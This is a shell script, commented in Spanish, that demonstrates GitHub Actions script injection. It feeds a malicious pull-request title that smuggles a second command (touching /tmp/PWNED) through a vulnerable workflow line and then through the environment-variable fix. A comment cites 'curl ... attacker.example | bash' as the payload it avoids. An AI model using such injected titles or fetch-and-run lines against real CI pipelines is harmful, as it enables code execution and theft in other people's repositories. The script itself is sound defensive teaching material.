#!/bin/sh
# Ejecuta DE VERDAD, en este contenedor aislado y SIN RED (network_mode: none
# en docker-compose.yml), los scripts que resultarian de expandir
# vulnerable.yml y fixed.yml con un titulo de PR malicioso.
#
# Por seguridad, el payload no intenta contactar ningun host real: en vez de
# "curl ... attacker.example | bash" usa un comando local inofensivo
# (crear /tmp/PWNED) que demuestra igual de bien la ejecucion de codigo
# arbitrario sin necesitar salida de red ni tocar nada fuera del contenedor.

set -x

MALICIOUS_TITLE='"; touch /tmp/PWNED && echo INJECTED_COMMAND_EXECUTED #'

echo "############################################"
echo "# 1) vulnerable.yml: expresion interpolada directamente en run:"
echo "############################################"
rm -f /tmp/PWNED

# Esta es la linea EXACTA de vulnerable.yml, con ${{ github.event.pull_request.title }}
# ya sustituido por el texto del payload -- exactamente como lo haria GitHub Actions.
eval "echo \"Gracias por tu PR: ${MALICIOUS_TITLE}\""

if [ -f /tmp/PWNED ]; then
  echo ">>> /tmp/PWNED existe: el comando inyectado SE EJECUTO. Vulnerable confirmado."
else
  echo ">>> /tmp/PWNED no existe (inesperado)."
fi

echo ""
echo "############################################"
echo "# 2) fixed.yml: expresion pasada por variable de entorno"
echo "############################################"
rm -f /tmp/PWNED

export PR_TITLE="$MALICIOUS_TITLE"
# Esta es la linea EXACTA de fixed.yml: usa $PR_TITLE como dato, no como script.
echo "Gracias por tu PR: $PR_TITLE"

if [ -f /tmp/PWNED ]; then
  echo ">>> /tmp/PWNED existe: esto NO debería pasar."
else
  echo ">>> /tmp/PWNED no existe: el payload se imprimió como texto, no se ejecutó nada. Corregido."
fi
